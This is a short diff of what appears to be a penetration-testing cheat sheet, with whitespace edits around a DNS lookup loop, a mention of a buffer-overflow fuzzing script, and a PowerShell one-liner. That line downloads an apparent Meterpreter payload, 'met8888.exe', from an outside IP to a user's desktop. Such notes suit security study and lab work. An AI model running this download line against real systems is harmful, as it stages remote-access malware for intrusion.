@@ -49,7 +49,7 @@ For loop example:
 	host -t a $server |grep "has address"  
 	done  
 
-****Python*** 
+****Python***  
 Simple socket script (with options) for sending incrementing "A's" for determining buffer overflow.  
 
 #!/usr/bin/python  
@@ -82,7 +82,9 @@ s.close()
 ****Powershell*** 
 .NET object to download a remote file:  
 
-(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')
+(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')  
+
+
 
 
         
